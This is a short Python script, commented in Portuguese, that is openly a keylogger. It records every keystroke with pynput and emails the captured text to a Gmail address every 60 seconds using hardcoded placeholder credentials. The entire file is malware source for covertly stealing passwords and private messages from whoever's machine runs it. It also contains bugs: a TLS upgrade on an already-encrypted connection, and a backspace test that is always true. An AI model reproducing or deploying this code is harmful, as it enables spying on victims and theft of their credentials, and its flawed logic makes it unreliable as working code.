from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

# configuraçôes de email
email_origem = "test.keylogger.test1@gmail.com"
email_destino = "test.keylogger.test1@gmail.com"
senha = "admin"

log =""

def enviarEmail():
    global log
    if log:
        msg = MIMEText(log)
        msg["SUBJECT"] = "dados capiturados pelo keylogger"
        msg["From"] = email_origem
        msg["To"] = email_destino
        try:
            server = smtplib.SMTP_SSL("smtp.gmail.com", 465)
            server.starttls()
            server.login(email_origem, senha)
            server.send_message(msg)
            server.quit()
        except Exception as erro:
            print("erro ao enviar", erro)

        log = ""

    #enviar pro email  a cada 60 segundos
    Timer(60, enviarEmail).start()

def onPress(key):
    global log 
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log += "[<]"
        else:
            pass

# inicia keylogger e o envio automatico

with keyboard.Listener(on_press=onPress) as listener:
    enviarEmail()
    listener.join()